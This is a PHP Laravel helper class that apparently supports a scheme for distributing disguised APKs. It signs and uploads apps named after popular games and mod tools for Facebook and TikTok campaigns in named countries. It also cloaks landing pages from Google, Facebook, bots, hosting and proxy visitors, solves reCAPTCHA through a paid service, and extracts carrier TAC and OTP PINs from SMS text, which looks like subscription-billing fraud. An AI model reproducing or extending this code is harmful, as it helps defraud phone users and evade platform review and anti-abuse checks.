<?php


namespace App\Helper;

use App\Jobs\UploadFileRemote;
use Illuminate\Support\Collection;
use Carbon\Carbon;
use Illuminate\Pagination\Paginator;
use Illuminate\Pagination\LengthAwarePaginator;
use Symfony\Component\Process\Process;

class Common
{
    const METHOD_GET = 'GET';
    const METHOD_POST = 'POST';
    const API_TIME_OUT = 30;

    public static function getCurrentVNTime($format = 'Y-m-d H:i:s')
    {
        return self::getCurrentTime('Asia/Ho_Chi_Minh', $format);
    }

    public static function getCurrentTime($timezone = 'UTC', $format = 'Y-m-d H:i:s')
    {
        return (new \DateTime())->setTimezone(new \DateTimeZone($timezone))->format($format);
    }

    public static function getUniqueStr()
    {
        $mt = microtime();
        $r = '';
        $length = strlen($mt);
        for ($i = 0; $i < $length; $i++) {
            if (ctype_digit($mt[$i])) {
                $r .= $mt[$i];
            }
        }

        return $r;
    }

    public static function getRealFileSize($path)
    {
        if (!file_exists($path))
            return false;

        $size = filesize($path);

        if (!($file = fopen($path, 'rb')))
            return false;

        if ($size >= 0) {
            if (fseek($file, 0, SEEK_END) === 0) {
                fclose($file);

                return self::filesizeConvert($size);
            }
        }

        $size = PHP_INT_MAX - 1;
        if (fseek($file, PHP_INT_MAX - 1) !== 0) {
            fclose($file);

            return false;
        }

        $length = 1024 * 1024;
        while (!feof($file)) {
            $read = fread($file, $length);
            $size = bcadd($size, $length);
        }
        $size = bcsub($size, $length);
        $size = bcadd($size, strlen($read));
        fclose($file);

        return self::filesizeConvert($size);
    }

    public static function filesizeConvert($bytes)
    {
        $bytes = floatval($bytes);
        $arBytes = [
            0 => [
                "UNIT" => "TB",
                "VALUE" => pow(1024, 4),
            ],
            1 => [
                "UNIT" => "GB",
                "VALUE" => pow(1024, 3),
            ],
            2 => [
                "UNIT" => "MB",
                "VALUE" => pow(1024, 2),
            ],
            3 => [
                "UNIT" => "KB",
                "VALUE" => 1024,
            ],
            4 => [
                "UNIT" => "B",
                "VALUE" => 1,
            ],
        ];

        foreach ($arBytes as $arItem) {
            if ($bytes >= $arItem["VALUE"]) {
                $result = $bytes / $arItem["VALUE"];
                $result = str_replace(".", ",", strval(round($result, 2))) . " " . $arItem["UNIT"];
                break;
            }
        }

        return $result;
    }

    public static function isFilesizeValid($filePath)
    {
        $size = Common::getRealFileSize($filePath);

        if (strpos($size, 'MB') !== false || strpos($size, 'GB') !== false) {
            return true;
        }

        return false;
    }

    public static function detectCountryByFilePrefix($filename)
    {
        $mapping = self::getCountriesMapping();
        $parts = explode('_', $filename);
        $prefix = $parts[0] . '_';

        if (empty($mapping[$prefix])) {
            return null;
        }

        return [
            'country' => strtolower($mapping[$prefix]->id),
            'region' => strtolower($mapping[$prefix]->region),
        ];
    }

    private static function getCountriesMapping()
    {
        $countries = \DB::table('countries')
            ->where('file_prefix', '!=', '')
            ->select(['id', 'region', 'file_prefix'])
            ->get()
            ->toArray();

        $mapping = [];
        foreach ($countries as $country) {
            $mapping[$country->file_prefix] = $country;
        }

        return $mapping;
    }

    public static function getAutoBuildApkCommand($sourceFilePath, $outputFilePath, $outputType = 'string', $country = null)
    {
        $baseDir = env('AUTO_BUILD_COMMAND_BASE_DIR');
        $tmpResult = 'java -jar ' . $baseDir . DIRECTORY_SEPARATOR . 'signapk.jar  ' . $baseDir . DIRECTORY_SEPARATOR . 'certificate.pem  ' . $baseDir . DIRECTORY_SEPARATOR . 'key.pk8  ' . $sourceFilePath . '  ' . $outputFilePath;

        $tmpResult = str_replace('  ', ' ', $tmpResult);

        return strtolower($outputType) == 'string' ? $tmpResult : explode(' ', $tmpResult);
    }

    public static function buildUpApk($filename, $country)
    {
        $inputFile = $country . DIRECTORY_SEPARATOR . $filename;
        $outputFile = $country . DIRECTORY_SEPARATOR . 'output' . DIRECTORY_SEPARATOR . $filename;
        $command = Common::getAutoBuildApkCommand($inputFile, $outputFile, 'array');
        $apkDir = env('APK_AUTO_BASE_DIR');
        $process = new Process($command, $apkDir);
        $process->run();

        if ($process->isSuccessful()) {
            $commandString = Common::getAutoBuildApkCommand($inputFile, $outputFile, 'string');
            dump('-> Run command ' . $commandString . ' successful');

            $outputFileFullPath = $apkDir . DIRECTORY_SEPARATOR . $outputFile;
            UploadFileRemote::dispatch($outputFileFullPath, $filename)->onQueue(LinodeStorageObject::getQueueDefault());

            dump('-> Uploading output file: ' . $outputFileFullPath);
        }
    }

    public static function isSMSEuAPK($filename)
    {
        if (!self::isWapAPK($filename) && strpos(strtolower($filename), 'debug') !== false) {
            return true;
        }

        return false;
    }

    public static function isSMSAisaAPK($filename)
    {
        if (!self::isWapAPK($filename) && strpos(strtolower($filename), 'release') !== false) {
            return true;
        }

        return false;
    }

    public static function isWapAPK($filename)
    {
        $prefix = substr(strtolower($filename), 0, 3);

        return strtolower($prefix) == 'wap';
    }

    public static function isSMSAisaCleanAPK($filename)
    {
        if (strpos(strtolower($filename), 'clean_') !== false && self::isSMSAisaAPK($filename)) {
            return true;
        }

        return false;
    }

    public static function isSMSEuCleanAPK($filename)
    {
        if (strpos(strtolower($filename), 'clean_') !== false && self::isSMSEuAPK($filename)) {
            return true;
        }

        return false;
    }

    public static function file2Array($file)
    {
        if (!is_file($file)) {
            return [];
        }

        return array_values(array_filter(file($file, FILE_IGNORE_NEW_LINES)));
    }

    public static function isFileUrlExist($url)
    {
        $curl = curl_init();

        try {
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_NOBODY, true);
            curl_exec($curl);

            $httpCode = intval(trim(curl_getinfo($curl, CURLINFO_HTTP_CODE)));
            curl_close($curl);
        } catch (\Exception $ex) {
            return false;
        }

        return ($httpCode != '404');
    }

    public static function generateCaptchaToken($apiKey, $siteKey, $url, $action)
    {
        $solver = new \TwoCaptcha\TwoCaptcha($apiKey);

        try {
            $result = $solver->recaptcha([
                'sitekey' => $siteKey,
                'url' => $url,
                'version' => 'v3',
                'action' => $action,
                'score' => 0.9,
            ]);
        } catch (\Exception $e) {
            $response = [
                'success' => false,
                'token' => null,
            ];

            return $response;
        }

        $resultArr = json_decode(json_encode($result), true);
        $token = $resultArr['code'] ?? null;
        $success = !empty($token);
        $response = [
            'success' => $success,
            'token' => $token,
        ];

        return $response;
    }

    public static function isBotDetected($userAgent)
    {
        if (preg_match(`/windows|abacho|compatible|Google-Read-Aloud|googleweblight|Macintosh|accona|
        AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|
        AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|
        BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|
        confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|
        dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|
        ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|
        find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|
        golem|bot|Google|google|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|
        havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|
        inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer
        |KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|
        Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|
        MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|
        NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|
        openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|
        pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|
        robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|
        sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|
        spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|
        topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|
        verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|
        WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|
        XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i`, $userAgent)) {
            return true;
        }

        return false;
    }


    public static function isCountryValid($ipInfo, $currentLPCountryCode, $debug = false)
    {
        if (empty($ipInfo)) {
            return true;
        }

        $arr = json_decode($ipInfo, true);
        if ($arr['query'] == '127.0.0.1') {
            return true;
        }

        $condition = strtolower($arr['status']) != 'success';

        if ($debug == false) {
            $condition = $condition || (isset($arr['hosting']) && $arr['hosting'] == true) || (!empty($arr['proxy']) && $arr['proxy'] == true);
        }

        if ($condition) {
            return false;
        }

        $countryCode = !empty($arr['countryCode']) ? strtoupper($arr['countryCode']) : null;

        return strtoupper($currentLPCountryCode) == strtoupper($countryCode);
    }

    public static function isIpGoogle($ipInfo, $debug = false)
    {
        if (empty($ipInfo)) {
            return false;
        }

        $arr = json_decode($ipInfo, true);

        if (strtolower($arr['status']) != 'success') {
            return false;
        }

        $condition = (!empty($arr['isp']) && strpos(strtolower($arr['isp']), 'google') !== false) ||
            (!empty($arr['asname']) && strpos(strtolower($arr['asname']), 'google') !== false) ||
            (!empty($arr['org']) && strpos(strtolower($arr['org']), 'google') !== false);

        if ($debug == false) {
            $condition = $condition || (!empty($arr['proxy']) && $arr['proxy'] == true) || (!empty($arr['hosting']) && $arr['hosting'] == true);
        }

        if ($condition) {
            return true;
        }

        return false;
    }

    public static function getIpInfo($ip = null)
    {
        $token = self::getIpToken();
        if (empty($token)) {
            return null;
        }

        $url = "https://pro.ip-api.com/json/$ip?key=$token&fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";

        return self::getContent($url);
    }

    public static function getIpToken()
    {
        $tokens = explode(',', getenv('IP_TOKENS'));

        if (empty($tokens)) {
            return null;
        }

        shuffle($tokens);

        return $tokens[array_rand($tokens, 1)];
    }

    public static function getContent($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        try {
            $output = curl_exec($ch);

            curl_close($ch);
        } catch (\Exception $ex) {
            curl_close($ch);

            return null;
        }

        return $output;
    }

    public static function getAutoBuildLinks($country = null)
    {
        $now = Common::getCurrentVNTime();
        $query = \DB::table('autobuild_links')->where('is_live', true)
            ->selectRaw('id, title, platform, country, link, created_at, datediff(?, created_at) as age', [$now]);

        if (!empty($country)) {
            $query->where('country', $country);
        }

        $files = $query->get()->toArray();

        return $files;
    }

    public static function isFileBuildNew($sourceFilePath, $outputFilePath, $country = null)
    {
        $platformMap = [
            'thailand' => ['Facebook', 'Tiktok'],
            'romania' => ['Facebook', 'Tiktok', 'Google'],
        ];

        $fileMap = [
            'thailand' => [
                'Facebook' => [
                    'Sigmabattleroyale.apk',
                    'CarXStreet.apk',
                    'Gta5.apk',
                ],
                'Tiktok' => [
                    'Gta5.apk',
                    'CarXStreet.apk',
                    'Happymod.apk',
                    'Youtubevanced.apk',
                    'Linelite.apk',
                    'Sigmabattleroyale.apk',
                ],

            ],
            'romania' => [
                'Facebook' => [],
                'Tiktok' => [],
                'Google' => [],

            ],

        ];

        $platform = LinodeStorageObject::getFilePlatform($sourceFilePath);

        if (in_array($country, ['thailand', 'romania']) && in_array($platform, $platformMap[$country])) {
            $fileShowUser = LinodeStorageObject::getBeautyFilenameFromSource($sourceFilePath);

            if (in_array($fileShowUser, $fileMap[$country][$platform])) {
                return true;
            }
        }

        return false;
    }

    public static function isDeviceExist($deviceId)
    {
        $device = \DB::table('devices_id')
            ->where('device_id', $deviceId)
            ->first();

        return !empty($device);
    }

    public static function saveDeviceInfo($deviceId, $userAgent, $ip = null, $country = null)
    {
        \DB::table('devices_id')
            ->insert([
                'device_id' => $deviceId,
                'user_agent' => $userAgent,
                'ip' => $ip,
                'country' => $country,
                'created_at' => Common::getCurrentVNTime(),
            ]);
    }

    public static function callUrl($url, $params, $method = self::METHOD_GET)
    {
        $response = null;

        $client = new \GuzzleHttp\Client([
            'timeout' => self::API_TIME_OUT,
        ]);


        if (strtoupper($method) == strtoupper(self::METHOD_GET)) {
            $response = $client->request('GET', $url);
        }

        if (strtoupper($method) == strtoupper(self::METHOD_POST)) {
            $response = $client->request('POST', $url, $params);
        }

        if (empty($response)) {
            return null;
        }

        return $response->getBody()->getContents();
    }

    public static function deleteDirectory($dir)
    {
        if (!file_exists($dir)) {
            return true;
        }

        if (trim($dir) == '/' || $dir == '/home' || $dir == '/root') {
            return false;
        }

        if (!is_dir($dir)) {
            return unlink($dir);
        }

        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            if (!self::deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }

        return rmdir($dir);
    }

    public static function uniqidReal($length = 13)
    {
        if (function_exists("random_bytes")) {
            $bytes = random_bytes(ceil($length / 2));
        } elseif (function_exists("openssl_random_pseudo_bytes")) {
            $bytes = openssl_random_pseudo_bytes(ceil($length / 2));
        } else {

            return ApkBuilder::getUniqueStr();
        }

        return substr(bin2hex($bytes), 0, $length);
    }

    public static function validateDate($date, $format = 'Y-m-d H:i:s')
    {
        $d = \DateTime::createFromFormat($format, $date);

        return $d && $d->format($format) == $date;
    }

    public static function convertTimemilisecondUtcToDatetime($milisecondsUtc, $format = 'Y-m-d H:i:s', $timezone = 'GTM+7')
    {
        return Carbon::createFromTimestampUTC($milisecondsUtc / 1000)->setTimezone($timezone)->format($format);
    }

    public static function getDomainFromUrl($url)
    {
        $arr = parse_url($url);

        if (!empty($arr['host'])) {
            return $arr['host'];
        }

        return null;
    }


    public static function getApks($country, $version = 3, $platform = 'all')
    {
        $table = LinodeStorageObject::getTableBuiltLinks($version);

        $query = \DB::table($table)
            ->where('country', $country)
            ->selectRaw('filename_show_user, platform, country, source_filename, source_file_path, app_id');

        if ($platform != 'all') {
            $query->where('platform', $platform);
        }

        $apks = $query->orderBy('source_filename')
            ->groupBy(['source_filename'])
            ->get();

        return $apks;
    }

    public static function getAppsForSelect($country, $platform, $version)
    {
        $apks = self::getApks($country, $version, $platform);
        $appsForSelect = [];
        foreach ($apks as $item) {
            $appsForSelect[] = [
                'id' => $item->app_id,
                'text' => $item->filename_show_user . ' (' . $item->platform . ')',
            ];
        }

        return $appsForSelect;
    }

    public static function covertDateTimeToMongoBSONDateGMT7($date)
    {
        return new \MongoDB\BSON\UTCDateTime(((new \DateTime($date))->getTimestamp() + (7 * 3600)) * 1000);
    }

    public static function paginate($items, $perPage = 15, $path = null, $pageName = 'page', $page = null, $options = [])
    {
        $page = $page ?: Paginator::resolveCurrentPage($pageName);
        $items = $items instanceof Collection ? $items : Collection::make($items);
        $options = ['path' => $path];

        return new LengthAwarePaginator($items->forPage($page, $perPage), $items->count(), $perPage, $page, $options);
    }

    public static function objectToArray($obj)
    {
        return json_decode(json_encode($obj), true);
    }

    public static function exportURLAndPinFromMSGMalaysia($message)
    {
        $export = [
            'pin' => '',
            'url' => ''
        ];

        $explodeForPin = explode('Your TAC is ', $message);
        $explodeForPin2 = explode('.', $explodeForPin[1]);
        $regex = '/^[0-9]{4}$/';
        $pre_match = preg_match($regex, $explodeForPin2[0], $matchesPin);
        if ($pre_match > 0) {
            $export['pin'] = $matchesPin[0];
        }

        $explodeForURL = explode('go to ', $message);
        $explodeForURL2 = explode(' in your', $explodeForURL[1]);
        $export['url'] = $explodeForURL2[0];

        return $export;
    }

    public static function exportURLAndPinFromDenmark($url)
    {
        $export = [
            'pin' => '',
            'url' => ''
        ];

        preg_match("/&?otp=([^&]+)/", $url, $matches);

        $export['url'] = $url;
        $export['pin'] = $matches[1];

        return $export;
    }

    public static function isIpFacebook($ipInfo)
    {
        if (empty($ipInfo)) {
            return false;
        }

        $arr = json_decode($ipInfo, true);

        if (strtolower($arr['status']) != 'success') {
            return false;
        }

        $condition = (!empty($arr['isp']) && strpos(strtolower($arr['isp']), 'facebook') !== false) ||
            (!empty($arr['asname']) && strpos(strtolower($arr['asname']), 'facebook') !== false) ||
            (!empty($arr['as']) && strpos(strtolower($arr['as']), 'facebook') !== false);

        if ($condition) {
            return true;
        }

        return false;
    }
}
